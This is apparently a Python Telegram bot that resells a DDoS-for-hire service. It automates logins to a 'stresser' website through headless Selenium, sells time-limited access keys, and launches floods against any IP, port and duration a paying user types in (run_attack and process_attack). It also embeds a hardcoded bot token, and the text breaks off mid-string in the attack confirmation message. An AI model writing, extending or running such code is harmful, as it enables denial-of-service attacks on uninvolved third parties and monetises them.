import asyncio
import time
import logging
import os
import re
import json
import string
import random
import pickle
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

BOT_TOKEN = "8562518597:AAGpVd-4xGZx3mJgkXQo2AYUKooJE_JWgZk"
OWNER_ID = 6643958471
CHROME_PATH = "/usr/bin/google-chrome"

DATA_JSON = "users_data.json"
DATA_TXT = "users_data.txt"
COOKIES_FILE = "session_cookies.pkl"

cooldown_enabled = True
cooldown_duration = 120
last_attack_time = 0

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

user_state = {}
driver = None
logged_in = False
data = {
    "approved_users": {},
    "admins": {},
    "keys": {},
    "disapproved_users": []
}

def load_data():
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON, 'r') as f:
                data = json.load(f)
            logger.info("Data loaded from JSON")
    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
        with open(DATA_TXT, 'w') as f:
            f.write("=" * 50 + "\n")
            f.write("📊 USER DATA - LAST UPDATED: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
            f.write("=" * 50 + "\n\n")
        logger.info("Data saved")
    except Exception as e:
        logger.error(f"Error saving data: {e}")

def get_time_left(expiry_str):
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
        now = datetime.now()
        delta = expiry - now
        if delta.days < 0:
            return "⚠️ Expired"
        return f"✅ {delta.days} days"
    except:
        return "N/A"

def generate_random_key():
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(20))

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    if str(user_id) in data.get("admins", {}):
        expiry_str = data["admins"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                del data["admins"][str(user_id)]
                save_data()
        except:
            pass
    return False

def is_approved(user_id):
    if is_admin(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        expiry_str = data["approved_users"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                del data["approved_users"][str(user_id)]
                save_data()
        except:
            pass
    return False

def is_disapproved(user_id):
    return user_id in data.get("disapproved_users", [])

def save_cookies():
    global driver
    try:
        if driver:
            cookies = driver.get_cookies()
            with open(COOKIES_FILE, 'wb') as f:
                pickle.dump(cookies, f)
            logger.info("Cookies saved")
    except Exception as e:
        logger.error(f"Error saving cookies: {e}")

def load_cookies():
    global driver
    try:
        if driver and os.path.exists(COOKIES_FILE):
            with open(COOKIES_FILE, 'rb') as f:
                cookies = pickle.load(f)
            for cookie in cookies:
                driver.add_cookie(cookie)
            logger.info("Cookies loaded")
            return True
    except Exception as e:
        logger.error(f"Error loading cookies: {e}")
    return False

def get_actual_chrome_path():
    if os.path.exists(CHROME_PATH):
        return os.path.realpath(CHROME_PATH)
    return None

async def initialize_browser():
    global driver
    try:
        if driver:
            return True
        
        real_path = get_actual_chrome_path()
        chrome_options = Options()
        if real_path:
            chrome_options.binary_location = real_path
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        logger.info("Browser initialized")
        return True
    except Exception as e:
        logger.error(f"Browser initialization error: {e}")
        return False

def check_global_cooldown():
    global last_attack_time, cooldown_enabled, cooldown_duration
    
    if not cooldown_enabled:
        return True, 0
    
    current_time = time.time()
    time_passed = current_time - last_attack_time
    
    if time_passed >= cooldown_duration:
        return True, 0
    else:
        remaining = int(cooldown_duration - time_passed)
        return False, remaining

def get_owner_keyboard():
    keyboard = [
        ["🔐 Login", "🔍 Check Status"],
        ["✅ Approve User", "❌ Disapprove User"],
        ["👮 Add Admin", "🚫 Remove Admin"],
        ["🎟️ Generate Key", "🚀 Run Attack"],
        ["📊 View Stats", "🔴 Logout"],
        ["⏱️ Cooldown ON/OFF", "⏲️ Set Cooldown"],
        ["🔁 /start"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_keyboard():
    keyboard = [
        ["✅ Approve User", "❌ Disapprove User"],
        ["👮 Add Admin", "🚫 Remove Admin"],
        ["🎟️ Generate Key", "🚀 Run Attack"],
        ["📊 View Stats"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_approved_keyboard():
    keyboard = [
        ["🚀 Run Attack"],
        ["📊 My Status"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_user_keyboard():
    keyboard = [
        ["🎟️ Redeem Key"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def start_login_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global driver, logged_in
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.", reply_markup=get_user_keyboard())
        return
    
    try:
        if not driver:
            await initialize_browser()
        
        driver.get("https://satellitestress.st/login")
        await asyncio.sleep(10)
        
        if load_cookies():
            driver.refresh()
            await asyncio.sleep(5)
            if "dashboard" in driver.current_url or "attack" in driver.current_url:
                logged_in = True
                await update.message.reply_text("✅ 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙡𝙤𝙜𝙜𝙚𝙙 𝙞𝙣! 🍪", reply_markup=get_owner_keyboard())
                return
        
        driver.save_screenshot("login_screen.png")
        with open("login_screen.png", 'rb') as photo:
            await update.message.reply_photo(photo=photo, caption="📸 𝙇𝙤𝙜𝙞𝙣 𝙋𝙖𝙜𝙚 𝙇𝙤𝙖𝙙𝙚𝙙.\n\n🔑 𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝘼𝙘𝙘𝙚𝙨𝙨 𝙏𝙤𝙠𝙚𝙣:")
        os.remove("login_screen.png")
        
        user_state[user_id] = {'step': 'waiting_token'}
    except Exception as e:
        await update.message.reply_text(f"❌ 𝙇𝙤𝙜𝙞𝙣 𝙀𝙧𝙧𝙤𝙧: {str(e)}")

async def enter_token(update: Update, context: ContextTypes.DEFAULT_TYPE, token: str):
    user_id = update.effective_user.id
    try:
        wait = WebDriverWait(driver, 15)
        token_field = wait.until(EC.presence_of_element_located((By.ID, "token")))
        token_field.clear()
        token_field.send_keys(token)
        
        user_state[user_id] = {'step': 'waiting_captcha'}
        driver.save_screenshot("captcha_view.png")
        with open("captcha_view.png", "rb") as photo:
            await update.message.reply_photo(photo=photo, caption="✅ 𝙏𝙤𝙠𝙚𝙣 𝙀𝙣𝙩𝙚𝙧𝙚𝙙.\n\n🔢 𝙉𝙤𝙬 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝘾𝙖𝙥𝙩𝙘𝙝𝙖 𝙘𝙝𝙖𝙧𝙖𝙘𝙩𝙚𝙧𝙨:")
        os.remove("captcha_view.png")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝙏𝙤𝙠𝙚𝙣 𝙀𝙧𝙧𝙤𝙧: {str(e)}")
        user_state.pop(user_id, None)

async def enter_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE, captcha: str):
    global logged_in
    user_id = update.effective_user.id
    try:
        captcha_field = driver.find_element(By.CSS_SELECTOR, "input[aria-label='Enter captcha answer']")
        captcha_field.send_keys(captcha)
        
        login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        login_btn.click()
        
        await asyncio.sleep(6)
        
        if "dashboard" in driver.current_url or "attack" in driver.current_url:
            logged_in = True
            save_cookies()
            await update.message.reply_text(
                "✅ 𝙇𝙤𝙜𝙞𝙣 𝙎𝙪𝙘𝙘𝙚𝙨𝙨! 🎉\n\n"
                "💾 𝙎𝙚𝙨𝙨𝙞𝙤𝙣 𝙨𝙖𝙫𝙚𝙙.\n"
                "🚀 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙖𝙩𝙩𝙖𝙘𝙠!",
                reply_markup=get_owner_keyboard()
            )
        else:
            driver.save_screenshot("fail.png")
            with open("fail.png", "rb") as f:
                await update.message.reply_photo(f, caption="❌ 𝙇𝙤𝙜𝙞𝙣 𝙛𝙖𝙞𝙡𝙚𝙙.")
            os.remove("fail.png")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝙇𝙤𝙜𝙞𝙣 𝙀𝙧𝙧𝙤𝙧: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def check_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.", reply_markup=get_user_keyboard())
        return
    
    if not driver:
        await update.message.reply_text("❌ 𝘽𝙧𝙤𝙬𝙨𝙚𝙧 𝙣𝙤𝙩 𝙞𝙣𝙞𝙩𝙞𝙖𝙡𝙞𝙯𝙚𝙙.", reply_markup=get_owner_keyboard())
        return
    
    try:
        current_url = driver.current_url
        if "dashboard" in current_url or "attack" in current_url:
            logged_in = True
            await update.message.reply_text("✅ 𝙎𝙩𝙖𝙩𝙪𝙨: 𝙇𝙊𝙂𝙂𝙀𝘿 𝙄𝙉 🟢", reply_markup=get_owner_keyboard())
        else:
            logged_in = False
            await update.message.reply_text("❌ 𝙎𝙩𝙖𝙩𝙪𝙨: 𝙉𝙊𝙏 𝙇𝙊𝙂𝙂𝙀𝘿 𝙄𝙉 🔴", reply_markup=get_owner_keyboard())
    except:
        logged_in = False
        await update.message.reply_text("❌ 𝙎𝙩𝙖𝙩𝙪𝙨: 𝙀𝙍𝙍𝙊𝙍 ⚠️", reply_markup=get_owner_keyboard())

async def logout_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global driver, logged_in
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.", reply_markup=get_user_keyboard())
        return
    
    if driver:
        driver.quit()
        driver = None
    logged_in = False
    await update.message.reply_text("✅ 𝘽𝙧𝙤𝙬𝙨𝙚𝙧 𝙨𝙚𝙨𝙨𝙞𝙤𝙣 𝙘𝙡𝙤𝙨𝙚𝙙. 🔴", reply_markup=get_owner_keyboard())

async def toggle_cooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cooldown_enabled
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.")
        return
    
    cooldown_enabled = not cooldown_enabled
    status = "𝙊𝙉 🔴" if cooldown_enabled else "𝙊𝙁𝙁 🟢"
    await update.message.reply_text(
        f"✅ 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙞𝙨 𝙣𝙤𝙬 {status}",
        reply_markup=get_owner_keyboard()
    )

async def set_cooldown_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.")
        return
    
    user_state[user_id] = 'awaiting_cooldown'
    await update.message.reply_text(
        "⏲️ 𝙎𝙚𝙩 𝙂𝙡𝙤𝙗𝙖𝙡 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣\n\n"
        "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣 𝙞𝙣 𝙨𝙚𝙘𝙤𝙣𝙙𝙨:\n"
        "𝙀𝙭𝙖𝙢𝙥𝙡𝙚: 60, 120, 300"
    )

async def process_set_cooldown(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    global cooldown_duration
    user_id = update.effective_user.id
    
    try:
        duration = int(text.strip())
        if duration < 10 or duration > 600:
            await update.message.reply_text("❌ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙘𝙝𝙤𝙤𝙨𝙚 𝙗𝙚𝙩𝙬𝙚𝙚𝙣 10-600 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.")
            return
        
        cooldown_duration = duration
        await update.message.reply_text(
            f"✅ 𝙂𝙡𝙤𝙗𝙖𝙡 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙨𝙚𝙩 𝙩𝙤 {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨",
            reply_markup=get_owner_keyboard()
        )
    except:
        await update.message.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙣𝙪𝙢𝙗𝙚𝙧.")
    finally:
        user_state.pop(user_id, None)

async def approve_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.", reply_markup=get_user_keyboard())
        return
    
    user_state[user_id] = {'action': 'approve'}
    await update.message.reply_text(
        "✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 𝙐𝙨𝙚𝙧\n\n"
        "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙: <𝙪𝙨𝙚𝙧_𝙞𝙙> <𝙙𝙖𝙮𝙨>"
    )

async def process_approve(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙤𝙧𝙢𝙖𝙩. 𝙐𝙨𝙚: <𝙞𝙙> <𝙙𝙖𝙮𝙨>")
            return
        
        target_id = parts[0]
        days = int(parts[1])
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        
        data["approved_users"][target_id] = {"expiry": expiry, "approved_by": user_id}
        if int(target_id) in data.get("disapproved_users", []):
            data["disapproved_users"].remove(int(target_id))
        save_data()
        
        await update.message.reply_text(
            f"✅ 𝙐𝙨𝙚𝙧 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙!\n\n"
            f"👤 𝙐𝙨𝙚𝙧 𝙄𝘿: {target_id}\n"
            f"📅 𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣: {days} 𝙙𝙖𝙮𝙨\n"
            f"⏰ 𝙀𝙭𝙥𝙞𝙧𝙚𝙨: {expiry}",
            reply_markup=get_admin_keyboard() if is_admin(user_id) else get_owner_keyboard()
        )
    except Exception as e:
        await update.message.reply_text(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def disapprove_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.", reply_markup=get_user_keyboard())
        return
    
    user_state[user_id] = {'action': 'disapprove'}
    await update.message.reply_text(
        "❌ 𝘿𝙞𝙨𝙖𝙥𝙥𝙧𝙤𝙫𝙚 𝙐𝙨𝙚𝙧\n\n"
        "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙪𝙨𝙚𝙧 𝙄𝘿:"
    )

async def process_disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        target_id = int(text.strip())
        
        if str(target_id) in data.get("approved_users", {}):
            del data["approved_users"][str(target_id)]
        if target_id not in data.get("disapproved_users", []):
            data["disapproved_users"].append(target_id)
        save_data()
        
        await update.message.reply_text(
            f"❌ 𝙐𝙨𝙚𝙧 𝘿𝙞𝙨𝙖𝙥𝙥𝙧𝙤𝙫𝙚𝙙!\n\n"
            f"👤 𝙐𝙨𝙚𝙧 𝙄𝘿: {target_id}\n"
            f"✓ 𝘼𝙘𝙘𝙚𝙨𝙨 𝙧𝙚𝙫𝙤𝙠𝙚𝙙",
            reply_markup=get_admin_keyboard() if is_admin(user_id) else get_owner_keyboard()
        )
    except Exception as e:
        await update.message.reply_text(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def add_admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.", reply_markup=get_user_keyboard())
        return
    
    user_state[user_id] = {'action': 'add_admin'}
    await update.message.reply_text(
        "👮 𝘼𝙙𝙙 𝘼𝙙𝙢𝙞𝙣\n\n"
        "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙: <𝙪𝙨𝙚𝙧_𝙞𝙙> <𝙙𝙖𝙮𝙨>"
    )

async def process_add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙤𝙧𝙢𝙖𝙩. 𝙐𝙨𝙚: <𝙞𝙙> <𝙙𝙖𝙮𝙨>")
            return
        
        target_id = parts[0]
        days = int(parts[1])
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        
        data["admins"][target_id] = {"expiry": expiry, "added_by": user_id}
        save_data()
        
        await update.message.reply_text(
            f"👮 𝘼𝙙𝙢𝙞𝙣 𝘼𝙙𝙙𝙚𝙙!\n\n"
            f"👤 𝙐𝙨𝙚𝙧 𝙄𝘿: {target_id}\n"
            f"📅 𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣: {days} 𝙙𝙖𝙮𝙨\n"
            f"⏰ 𝙀𝙭𝙥𝙞𝙧𝙚𝙨: {expiry}",
            reply_markup=get_admin_keyboard() if is_admin(user_id) else get_owner_keyboard()
        )
    except Exception as e:
        await update.message.reply_text(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def remove_admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.", reply_markup=get_user_keyboard())
        return
    
    user_state[user_id] = {'action': 'remove_admin'}
    await update.message.reply_text(
        "🚫 𝙍𝙚𝙢𝙤𝙫𝙚 𝘼𝙙𝙢𝙞𝙣\n\n"
        "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙪𝙨𝙚𝙧 𝙄𝘿:"
    )

async def process_remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        target_id = text.strip()
        
        if target_id in data.get("admins", {}):
            del data["admins"][target_id]
            save_data()
            await update.message.reply_text(
                f"🚫 𝘼𝙙𝙢𝙞𝙣 𝙍𝙚𝙢𝙤𝙫𝙚𝙙!\n\n"
                f"👤 𝙐𝙨𝙚𝙧 𝙄𝘿: {target_id}",
                reply_markup=get_admin_keyboard() if is_admin(user_id) else get_owner_keyboard()
            )
        else:
            await update.message.reply_text(f"❌ 𝙐𝙨𝙚𝙧 {target_id} 𝙞𝙨 𝙣𝙤𝙩 𝙖𝙣 𝙖𝙙𝙢𝙞𝙣.")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def gen_key_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.", reply_markup=get_user_keyboard())
        return
    
    user_state[user_id] = {'action': 'gen_key'}
    await update.message.reply_text(
        "🎟️ 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚 𝘼𝙘𝙘𝙚𝙨𝙨 𝙆𝙚𝙮\n\n"
        "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙙𝙖𝙮𝙨:"
    )

async def process_gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        days = int(text.strip())
        key = generate_random_key()
        
        data["keys"][key] = {
            "days": days,
            "created_by": user_id,
            "redeemed": False,
            "redeemed_by": None
        }
        save_data()
        
        await update.message.reply_text(
            f"🎟️ 𝘼𝙘𝙘𝙚𝙨𝙨 𝙆𝙚𝙮 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙!\n\n"
            f"🔑 𝙆𝙚𝙮: {key}\n"
            f"📅 𝙑𝙖𝙡𝙞𝙙 𝙛𝙤𝙧: {days} 𝙙𝙖𝙮𝙨\n"
            f"✨ 𝙎𝙩𝙖𝙩𝙪𝙨: 𝙉𝙤𝙩 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙",
            reply_markup=get_admin_keyboard() if is_admin(user_id) else get_owner_keyboard()
        )
    except Exception as e:
        await update.message.reply_text(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    approved_count = len(data.get("approved_users", {}))
    admin_count = len(data.get("admins", {}))
    key_count = len(data.get("keys", {}))
    redeemed_count = sum(1 for k in data.get("keys", {}).values() if k.get("redeemed"))
    disapproved_count = len(data.get("disapproved_users", []))
    
    msg = (
        f"📊 𝙎𝙮𝙨𝙩𝙚𝙢 𝙎𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨\n\n"
        f"✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙐𝙨𝙚𝙧𝙨: {approved_count}\n"
        f"👮 𝘼𝙙𝙢𝙞𝙣𝙨: {admin_count}\n"
        f"🎟️ 𝙏𝙤𝙩𝙖𝙡 𝙆𝙚𝙮𝙨: {key_count}\n"
        f"✓ 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙 𝙆𝙚𝙮𝙨: {redeemed_count}\n"
        f"❌ 𝘿𝙞𝙨𝙖𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙐𝙨𝙚𝙧𝙨: {disapproved_count}\n\n"
        f"🔄 𝙇𝙖𝙨𝙩 𝙐𝙥𝙙𝙖𝙩𝙚𝙙: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    keyboard = get_owner_keyboard() if is_owner(user_id) else get_admin_keyboard()
    await update.message.reply_text(msg, reply_markup=keyboard)

async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    
    if is_owner(user_id):
        msg = f"👤 𝙐𝙨𝙚𝙧 𝙄𝘿: {user_id}\n📛 𝙉𝙖𝙢𝙚: {user.first_name}\n\n"
        msg += "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 (𝙊𝙬𝙣𝙚𝙧)\n"
        msg += "⏰ 𝙀𝙭𝙥𝙞𝙧𝙮: 𝙐𝙣𝙡𝙞𝙢𝙞𝙩𝙚𝙙"
        keyboard = get_owner_keyboard()
    elif is_admin(user_id):
        expiry = data["admins"][str(user_id)].get("expiry")
        days = get_time_left(expiry)
        msg = f"👤 𝙐𝙨𝙚𝙧 𝙄𝘿: {user_id}\n📛 𝙉𝙖𝙢𝙚: {user.first_name}\n\n"
        msg += "👮 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 (𝘼𝙙𝙢𝙞𝙣)\n"
        msg += f"⏰ {days}"
        keyboard = get_admin_keyboard()
    elif is_approved(user_id):
        expiry = data["approved_users"][str(user_id)].get("expiry")
        days = get_time_left(expiry)
        msg = f"👤 𝙐𝙨𝙚𝙧 𝙄𝘿: {user_id}\n📛 𝙉𝙖𝙢𝙚: {user.first_name}\n\n"
        msg += "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿\n"
        msg += f"⏰ {days}"
        keyboard = get_approved_keyboard()
    else:
        msg = f"👤 𝙐𝙨𝙚𝙧 𝙄𝘿: {user_id}\n📛 𝙉𝙖𝙢𝙚: {user.first_name}\n\n"
        msg += "❌ 𝙉𝙊𝙏 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿\n\n"
        msg += "𝙏𝙤 𝙗𝙪𝙮 𝙠𝙚𝙮: @MRXYTDM"
        keyboard = get_user_keyboard()
    
    await update.message.reply_text(msg, reply_markup=keyboard)

async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_approved(user_id):
        await update.message.reply_text(
            "❌ 𝙉𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.\n\n𝙏𝙤 𝙗𝙪𝙮 𝙠𝙚𝙮: @MRXYTDM",
            reply_markup=get_user_keyboard()
        )
        return
    
    can_attack, wait_time = check_global_cooldown()
    if not can_attack:
        await update.message.reply_text(
            f"⏳ 𝙂𝙡𝙤𝙗𝙖𝙡 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙖𝙘𝙩𝙞𝙫𝙚\n\n"
            f"𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {wait_time} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨",
            reply_markup=get_approved_keyboard()
        )
        return
    
    if not logged_in or not driver:
        await update.message.reply_text(
            "❌ 𝙎𝙚𝙧𝙫𝙚𝙧 𝙣𝙤𝙩 𝙧𝙚𝙖𝙙𝙮\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙤𝙧 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @MRXYTDM",
            reply_markup=get_approved_keyboard() if is_approved(user_id) else get_user_keyboard()
        )
        return
    
    user_state[user_id] = 'awaiting_attack'
    await update.message.reply_text(
        "🚀 𝙍𝙀𝘼𝘿𝙔 𝙏𝙊 𝘼𝙏𝙏𝘼𝘾𝙆 🚀\n\n𝙏𝙮𝙥𝙚 👉: <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚>",
        parse_mode='Markdown'
    )

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global last_attack_time
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_state or user_state[user_id] != 'awaiting_attack':
        return
    
    parts = text.split()
    if len(parts) != 3:
        await update.message.reply_text(
            "❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙤𝙧𝙢𝙖𝙩\n\n𝙐𝙨𝙚 👉: <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚>",
            parse_mode='Markdown'
        )
        del user_state[user_id]
        return
    
    ip, port, duration = parts
    
    try:
        port = int(port)
        duration = int(duration)
    except:
        await update.message.reply_text(
            "❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙣𝙪𝙢𝙗𝙚𝙧𝙨",
            reply_markup=get_approved_keyboard()
        )
        del user_state[user_id]
        return
    
    await update.message.reply_text("⚡ 𝙒𝙖𝙞𝙩 5 𝙎𝙚𝙘𝙤𝙣𝙙𝙨...")
    
    try:
        driver.get("https://satellitestress.st/attack")
        await asyncio.sleep(6)
        
        wait = WebDriverWait(driver, 20)
        
        ip_in = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder='104.29.138.132']")))
        ip_in.clear()
        ip_in.send_keys(ip)
        
        port_in = driver.find_element(By.CSS_SELECTOR, "input[placeholder='80']")
        port_in.clear()
        port_in.send_keys(str(port))
        
        time_in = driver.find_element(By.CSS_SELECTOR, "input[placeholder='60']")
        time_in.clear()
        time_in.send_keys(str(duration))
        
        launch_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//button[contains(text(), 'Launch Attack')]")))
        driver.execute_script("arguments[0].click();", launch_btn)
        
        await asyncio.sleep(2)
        
        last_attack_time = time.time()
        
        await update.message.reply_text(
            f"🚀 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 🚀\n\n"
